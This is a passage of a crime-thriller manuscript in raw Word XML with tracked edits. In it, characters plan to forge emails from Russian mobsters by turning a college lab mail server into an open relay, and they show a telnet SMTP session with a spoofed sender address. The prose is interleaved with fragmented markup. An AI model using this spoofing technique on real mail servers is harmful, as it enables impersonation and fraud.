          <w:delText>eekly</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rolled his eyes. “Pffft. Amateurs.”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“Come again?” Tina squeaked.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“Listen,” said Jason. “You hold more cards than you think. A party only resorts to threats if they have nothing of value. If the first instinct of these Russians is to go straight for your jugular, then they’re approaching the negotiation from a position of weakness.”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stared at him incredulously. “You’re saying the mob is in a ‘position of weakness’?”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absolutely,” said Jason. “Think about it. They’re a criminal organization that’s at constant risk from both rivals and law enforcement. They have a lot to lose. Believe me, this stuff I know. I may be out of my league when it comes to tech, but they do teach us something in business school.”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“We’re not dealing with a business here!” Tina cried. “We’re </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1972" w:author="TextVet" w:date="2016-03-21T11:44:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>dealing</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> with the mob!”</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Jason smiled. “What do you think the mob is? Whatever else may be true about them, they’re rational players. They have to watch their bottom line. I didn’t get rich by playing the lottery, you know. I made my money by understanding what people </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1973" w:author="TextVet" w:date="2016-03-21T11:45:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>want</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>So</w:t>
      </w:r>
      <w:ins w:id="1974" w:author="TextVet" w:date="2016-03-21T11:45:00Z">
        <w:r w:rsidR="006A2279">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let’s try and understand these guys. What do we know about them? What can we deduce about their needs, their risks, their motivations? Anything?”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handed a cellphone to Jason. “I know a thing or two about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looked at the small screen, perplexed at first, then excited. Moshen looked over enthusiastically. Mike craned his neck. Hoots and high-fives were exchanged.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lot of the emails are in Russian,” said Danny. “Could you guys run them through an online translator?”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took the phone. “No problem, Danny,” he said, and twirled back to his laptop.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nodded. “We’ve got them by the balls</w:t>
      </w:r>
      <w:ins w:id="1975" w:author="TextVet" w:date="2016-03-21T11:46:00Z">
        <w:r w:rsidR="0063093B">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and they don’t even know it. Christina, I can get you out of this. Do you trust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don’t have much choice, do I?” she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extended a hand</w:t>
      </w:r>
      <w:ins w:id="1976" w:author="TextVet" w:date="2016-03-21T11:47:00Z">
        <w:r w:rsidR="007C3C4E">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del w:id="1977" w:author="TextVet" w:date="2016-03-21T11:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007C3C4E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">out to </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1978" w:author="TextVet" w:date="2016-03-21T11:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007C3C4E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>her with his</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> palm up</w:t>
      </w:r>
      <w:ins w:id="1979" w:author="TextVet" w:date="2016-03-21T11:47:00Z">
        <w:r w:rsidR="007C3C4E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, to her</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “The vial, please.”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shot him a look of suspicion so hot it could’ve ignited his gelled hair.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either me or the Russians.”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grudgingly pulled the vial out of her purse and put it in his palm. Jason’s fingers curled around it like the fronds of a carnivorous plant.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turned to his team. “Moshen. What have you been able to learn so far from that phone?”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 a ton,” Moshen replied. “There’s as much English and Spanish as there is Russian in these emails. And my Spanish sucks, and the English is really, really bad English. It’s all ghetto slang and innuendoes.”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nodded knowingly. “Spanish, and gangbanger English… Let me guess. All the Russian-language emails are among a small group of people, and it’s mostly talking about high-level strategy and probably a bunch of family matters, right? And then everything else is in Spanish and English, and it’s all very short and specific, mostly giving orders and demanding status reports.”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nodded. “…Yeah, I’d say that sums it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chimed in. “Wait, I get it. Their inner circle is all the same Russian family. But their foot soldiers are just random thugs that they hire from around the neighborhood, and it’s these low-level employees that do the day-to-day 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nodded. “Exactly. Moshen, do they say where they’re keeping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 quite,” Moshen said. “They mentioned something about making her set up a factory in a rented warehouse space. Or set up a warehouse in a rented factory space.”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suggested, “You know, that phone has GPS…” He took the Pantech from Moshen and gave it a few quick pokes. “AT&amp;T Navigator… Recent Places… Done.” He passed the phone around for the team to examine.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Jason </w:t>
      </w:r>
      <w:ins w:id="1980" w:author="TextVet" w:date="2016-03-21T16:14:00Z">
        <w:r w:rsidR="001271B5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>studied</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1981" w:author="TextVet" w:date="2016-03-21T16:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001271B5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>looked at</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> it. “Promising, but there’</w:t>
      </w:r>
      <w:ins w:id="1982" w:author="TextVet" w:date="2016-03-21T16:14:00Z">
        <w:r w:rsidR="00312CAA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>re</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1983" w:author="TextVet" w:date="2016-03-21T16:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00312CAA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>s</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> over three dozen addresses in that history list. Can we narrow it down?”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said Danny. “Hop on Google Maps. They said they’re going to make her work at a factory or warehouse. Use Satellite View to check which of these addresses are in industrial zones.” As Moshen got to work, Danny turned to Jason. “Assuming you do find this Julie girl, what’s your plan?”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“Bribery,” Jason answered. “Find some low-ranking worker and pay him off.”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shook his head. “It’d have to be one hell of a bribe, Jason. A guy like that could end up at the bottom of Puget Sound.”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admit it isn’t the best of strat</w:t>
      </w:r>
      <w:ins w:id="1984" w:author="TextVet" w:date="2016-03-21T16:16:00Z">
        <w:r w:rsidR="00603A0A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>e</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>gies,” Jason said sourly. “After all, if the mob thought one of their own was on the take, all hell would break loose. I don’t know exactly what’s the Russian mafia’s disaster plan for internal espionage, but I’ve seen what happens at corporations when management thinks some employees might be secretly working for a competitor. It isn’t pretty.”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away pensively. “What if…”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if what?”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if that was the point?” Danny offered.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cocked his head. “Not following…”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turned to his fellow computer geeks. “Guys. Do any of you happen to have admin privileges on an SMTP server?”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slowly raised one feeble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smiled. “Of course. From your Cisco certification classes.”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nodded. “The teacher gives us a couple of servers to play with.”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replied, “Can you configure it to bypass all authentication mechanisms and function as an open mail relay?”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w:t>
      </w:r>
      <w:ins w:id="1985" w:author="TextVet" w:date="2016-03-21T16:18:00Z">
        <w:r w:rsidR="00FB304F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">’s </w:t>
        </w:r>
        <w:r w:rsidR="00FB304F" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>large brow</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> furrowed</w:t>
      </w:r>
      <w:del w:id="1986" w:author="TextVet" w:date="2016-03-21T16:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FB304F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> his large brow</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “Yeah, but we’re not supposed to do that. The very first thing we learn is how to </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>prevent</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> them from running as open mail relays.”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grinned. “And why exactly is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“Because open mail relays make the whole Internet a worse place,” Mike answered. “Spammers from all over the world constantly look for them. Open mail relays are where all those spam messages for penis enlargement pills and herbal Viagra and discount mortgages come from.”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“Yep. And </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>why</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> do spammers need open mail relays for that?”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“Because open relays are completely anonymous,” Mike answered. “An open relay doesn’t verify the source of the message. It just forwards everything stupidly along.”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“Exactly. So, if we wanted to forge a bunch of emails from the Russian mob guys to their foot</w:t>
      </w:r>
      <w:ins w:id="1987" w:author="TextVet" w:date="2016-03-21T16:20:00Z">
        <w:r w:rsidR="00222A80">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1988" w:author="TextVet" w:date="2016-03-21T16:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00222A80">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soldiers…”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="0039669C" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:del w:id="1989" w:author="TextVet" w:date="2016-03-21T16:21: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w:t>
      </w:r>
      <w:ins w:id="1990" w:author="TextVet" w:date="2016-03-21T16:22:00Z">
        <w:r w:rsidR="00A001D2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">’s </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1991" w:author="TextVet" w:date="2016-03-21T16:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A001D2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> widened his </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>eyes</w:t>
      </w:r>
      <w:ins w:id="1992" w:author="TextVet" w:date="2016-03-21T16:22:00Z">
        <w:r w:rsidR="00A001D2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> grapefruited</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “…We’d need an open mail relay!”</w:t>
      </w:r>
      <w:ins w:id="1993" w:author="TextVet" w:date="2016-03-21T16:21:00Z">
        <w:r w:rsidR="0039669C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="0039669C" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1994" w:author="TextVet" w:date="2016-03-21T16:21:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>He</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1995" w:author="TextVet" w:date="2016-03-21T16:21:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="0039669C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Eagerly, the large scruffy man</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> grabbed a laptop</w:t>
      </w:r>
      <w:ins w:id="1996" w:author="TextVet" w:date="2016-03-21T16:21:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> hungrily</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:ins w:id="1997" w:author="TextVet" w:date="2016-03-21T16:22:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>It</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1998" w:author="TextVet" w:date="2016-03-21T16:22:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="0039669C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>The computer</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> seesawed on his lap as he punched on the keyboard.</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4400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>telnet localhost 25</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terminal window replied:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>220-mail46.cisco.bellevuecollege.edu ESMTP Exim 4.69 #1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t xml:space="preserve">220-This computer system is solely for use by Bellevue </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t xml:space="preserve">220 College staff and students. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t xml:space="preserve">220-We do not authorize the use of this system to </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>220 transport unsolicited, and/or bulk e-mail.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empty cursor blinked alone on the blank line below the message. Mike knew that it was waiting for a few words of SMTP, the primitive language spoken by mailservers.</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4400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>MAIL FROM:sergey@pash.ly</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>250 OK</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pP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4400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>RCPT TO:eugene@pash.ly</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>250 Accepted</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pP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4400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>DATA</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>354 Enter message, ending with "." on a line by itself</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pP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t>To: "Eugene &lt;eugene@pash.ly&gt;"</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t>From: "Sergey &lt;sergey@pash.ly&gt;"</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t>Subject: This is a test</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t>Mary had a little lamb, whose fleece was white as snow.</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t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
